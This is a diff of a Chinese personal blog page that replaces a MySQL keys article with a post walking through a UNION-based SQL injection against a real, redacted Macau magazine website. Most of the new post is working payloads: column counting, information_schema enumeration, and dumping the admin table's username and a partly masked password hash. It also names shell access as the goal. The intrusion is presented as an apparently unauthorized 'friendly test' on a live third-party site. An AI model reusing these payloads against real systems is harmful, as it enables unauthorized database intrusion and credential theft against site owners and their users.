@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>MYSQL | 大棟哥の博客</title>
+  <title>SQL实例2 | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -259,51 +259,41 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2016-06-01T08:18:15.000Z" itemprop="datePublished">
-          2016-06-01
+      <time datetime="2016-07-11T13:11:00.000Z" itemprop="datePublished">
+          2016-07-11
       </time>
     
+    
+    | 
+    <a href='/tags/SQL-inject/'>SQL inject</a>
+    
+    
 </span>
-                <h1>MYSQL</h1>
+                <h1>SQL实例2</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>mysql中的键（转载）：<br>键和外键是把多个表组织为一个有效的关系数据库的粘合剂。主键和外键的设计对物理数据库的性能和可用性都有着决定性的影响。<br>必须将数据库模式从理论上的逻辑设计转换为实际的物理设计。而主键和外键的结构是这个设计过程的症结所在。一旦将所设计的数据库用于了生产环境，就很难对这些键进行修改，所以在开发阶段就设计好主键和外键就是非常必要和值得的。<br>首先来谈：主键。<br>关系数据库依赖于主键—它是数据库物理模式的基石。主键在物理层面上只有两个用途：</p>
-<ol>
-<li>惟一地标识一行。</li>
-<li>作为一个可以被外键有效引用的对象。</li>
-</ol>
-<p>基于以上这两个用途，下面给出了在物理层面的主键时所遵循的一些原则：</p>
-<ol>
-<li>主键应当是对用户没有意义的。如果用户看到了一个表示多对多关系的连接表中的数据，并抱怨它没有什么用处，那就证明它的主键设计地很好。</li>
-<li>主键应该是单列的，以便提高连接和筛选操作的效率。</li>
-</ol>
-<p>注：使用复合键的人通常有两个理由为自己开脱，而这两个理由都是错误的。其一是主键应当具有实际意义，然而，让主键具有意义只不过是给人为地破坏数 据库提供了方便。其二是利用这种方法可以在描述多对多关系的连接表中使用两个外部键来作为主键，我也反对这种做法，理由是：复合主键常常导致不良的外键， 即当连接表成为另一个从表的主表，而依据上面的第二种方法成为这个表主键的一部分，然，这个表又有可能再成为其它从表的主表，其主键又有可能成了其它从表 主键的一部分，如此传递下去，越靠后的从表，其主键将会包含越多的列了。</p>
-<ol>
-<li>永远也不要更新主键。实际上，因为主键除了惟一地标识一行之外，再没有其他的用途了，所以也就没有理由去对它更新。如果主键需要更新，则说明主键应对用户无意义的原则被违反了。<br>注：这项原则对于那些经常需要在数据转换或多数据库合并时进行数据整理的数据并不适用。</li>
-<li>主键不应包含动态变化的数据，如时间戳、创建时间列、修改时间列等。</li>
-<li>主键应当有计算机自动生成。如果由人来对主键的创建进行干预，就会使它带有除了惟一标识一行以外的意义。一旦越过这个界限，就可能产生认为修改主键的动机，这样，这种系统用来链接记录行、管理记录行的关键手段就会落入不了解数据库设计的人的手中。<br>外键是用来和其他表建立联系用的：这个表中的一列和另外一个表中的一列相同，为了让这两个表联系起来，就把其中一个表中的列设成外键，把另外一个表列设成主键，就实现了这两个表的关联。<br>ps：一个表可以有多个外键。但主键只能有一个。</li>
-</ol>
-<p>主键:<br>能够唯一表示数据表中的每个记录的【字段】或者【字段】的组合就称为主码(主键)。 一个主键是唯一识别一个表的每一记录，但这只是其作用的一部分，主键的主要作用是将记录和存放在其他表中的数据进行关联。在这一点上，主键是不同表中各记 录之间的简单指针。主键约束就是确定表中的每一条记录。主键不能是空值。唯一约束是用于指定一个或多个列的组合值具有惟一性，以防止在列中输入重复的值。 所以，主键的值对用户而言是没有什么意义，并且和它要赋予的值也没有什么特别的联系。<br>外键：<br>若有两个表A，B，C是A的主键，而B中也有C字段，则C就是表B的外键。外键约束主要用来维护两个表之间数据的一致性。<br>A为基本表，B为信息表！</p>
+      		<p>0x00.【原理】<br>SQL（结果化查询语言）是一种用户和数据库交互的文本语言，SQL注入就是利用某些数据库某些外部接口把用户输入的数据插入到数据库中进行操作，从而达到入侵数据库的目的。产生的主要原因是没有对用户输入的数据进行过滤，导致非法数据的提交！<br>0x01.【步骤】<br>1、判断web环境是否可以SQL注入：如果URL仅仅对网页访问就不存在SQL注入；只有对数据库进行动态查询才有可能存在SQL注入；<br>2、测试注入点：对于GET类型的，可以在URL中输入特殊字符来进行判断；通过浏览器插件进行测试；通过burpsuit抓包进行测试；<br>3、猜解用户名和密码：可以通过构造payload进行库、表、字段、内容的猜解，也可以通过工具进行跑用户名和密码；<br>4、查找后台：后台管理员界面一般不想普通用户开放，可以根据自己的经验进行后台的路径的尝试，后者使用工具进行批量的扫描；<br>5、getshell:进入管理员后台之后，获取shell查看权限，低权限的话要进行提权，最终实现控制服务器。<br>0x02.【目标】<br>澳门某精品杂志<br>目标站点：<a href="http://www.XXXXXXXX.com/" target="_blank" rel="external">http://www.XXXXXXXX.com/</a><br>注入点：<a href="http://www.XXXXXXX.com/cn/Consultingin.php?id=716" target="_blank" rel="external">http://www.XXXXXXX.com/cn/Consultingin.php?id=716</a><br>注入类型：UNION query<br>0x03.【步骤】<br>a)确定目标网站，进行信息收集；<br>b)寻找注入点；<br>c)构造payload爆出数据库、表、字段，拿到用户名和密码；<br>d)查找后台；<br>e)获取getshell<br>0x04.【流程】<br>注：本次试验只对目标网站进行sql注入测试！<br>1、对目标进行测试：<br>payload：<a href="http://www.XXXXXXX.com/cn/Consultingin.php?id=716’" target="_blank" rel="external">http://www.XXXXXXX.com/cn/Consultingin.php?id=716’</a><br>出现如下报错信息，可能存在注入：<br>Unknown column ‘716’’ in ‘where clause’<br>2、猜解字段，经过测试有18个字段：<br>payload：?id=716 order by 19时出现如下报错信息<br>Unknown column ‘19’ in ‘order clause’<br>payload：?id=716 order by 18 显示正常<br>说明有18个字段<br>3、查找一下显示位，发现有三个显示位：<br>payload：id=-716 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18<br>发现2,9,18三个地方为显示位，如下图：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sql%E5%AE%9E%E4%BE%8B2/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"><br>4、看一下基本信息：<br>payload：<a href="http://www.XXXXXXX.com/cn/Consultingin.php?id=-716" target="_blank" rel="external">http://www.XXXXXXX.com/cn/Consultingin.php?id=-716</a> UNION     SELECT 1,database(),3,4,5,6,7,8,user(),10,11,12,13,14,15,16,17,version()<br>查看一下数据库版本号、当前数据库、当前用户<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sql%E5%AE%9E%E4%BE%8B2/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"><br>5、构造payload查看数据库，有两个库：<br>payload：<a href="http://www.XXXXXXX.com/cn/Consultingin.php?id=-716" target="_blank" rel="external">http://www.XXXXXXX.com/cn/Consultingin.php?id=-716</a> UNION     SELECT1,group_concat(distinct+table_schema),3,4,5,6,7,8,user(),10,11,12,13,14,    15,16,17,version()+from+information_schema.tables<br>爆出两个数据库：<br>information_schema、hotel93<br>6、看一下hotel93库里边的表：<br>payload：<a href="http://www.XXXXXXXX.com/cn/Consultingin.php" target="_blank" rel="external">http://www.XXXXXXXX.com/cn/Consultingin.php</a><br>?id=-716 UNION SELECT         1,group_concat(distinct+table_name),3,4,5,6,7,8,user(),10,11,12,13,14,15,16,17,    version()+from+information_schema.tables+where+Table_ScheMa=0x686f74656    c3933<br>表名如下：<br>wd_admin_user,wd_cate,wd_category,wd_dl_file,wd_dy,wd_hy_jx,wd_hy_sm,wd_hy_xinshu,wd_hybm,wd_hycon,wd_hycs,wd_hymoney,wd_hyry,wd_hysf,wd_image,wd_info,wd_message,wd_news,wd_pro<br>7、看一个wd_admin_user表下字段：<br>payload：<a href="http://www.XXXXXXXXX.com/cn/Consultingin.php" target="_blank" rel="external">http://www.XXXXXXXXX.com/cn/Consultingin.php</a><br>?id=-716 UNION SELECT     1,group_concat(column_name),3,4,5,6,7,8,user(),10,11,12,13,14,15,16,17,versio    n()+from+information_schema.columns+where+Table_ScheMa=0x686f74656c39    33+and+table_name=0x77645f61646d696e5f75736572<br>有三个字段：<br>id、username、pwd</p>
+<p>8、越来越近结果了，看一下用户名和密码字段里边的内容：<br>payload：<a href="http://www.XXXXXXXXX.com/cn/Consultingin.php" target="_blank" rel="external">http://www.XXXXXXXXX.com/cn/Consultingin.php</a><br>?id=-716 UNION SELECT     1,group_concat(username,pwd,0x7c7c),3,4,5,6,7,8,user(),10,11,12,13,14,15,16,    17,version()+from+wd_admin_user<br>最终结果：<br>admin21232f297axxxxxx3894a0e4a801fc3||<br>接下来就是找后台、、、好了，友情测试到此结束！<br>0x05.【总结】<br>sql注入危害很大，代码要对输入的数据进行过滤，错误信息要尽量少，注入的时候构造payload是很重要的！<br>——EOF——</p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="pagination" role="pagination">
     
-    <a class="pull-left" href="/2016/06/15/php文件包含漏洞/" style="float: left;">
-        ← php文件包含漏洞
+    <a class="pull-left" href="/2016/07/21/XSS01/" style="float: left;">
+        ← XSS实例1
     </a>
     
     
-    <a class="pull-right" href="/2016/05/29/PHP-array-data-structure/">
-        PHP array data structure →
+    <a class="pull-right" href="/2016/07/10/SQL实例1/">
+        SQL实例1 →
     </a>
     
 </nav>
 
         <div class="duoshuo">
-<div class="ds-thread" data-thread-key="2016/06/01/MYSQL/" data-title="MYSQL" data-url="http://jiadong.xin/2016/06/01/MYSQL/"></div>
+<div class="ds-thread" data-thread-key="2016/07/11/SQL实例2/" data-title="SQL实例2" data-url="http://jiadong.xin/2016/07/11/SQL实例2/"></div>
 <script type="text/javascript">
 var duoshuoQuery = {short_name:"duoshuo_name"};
 (function() {
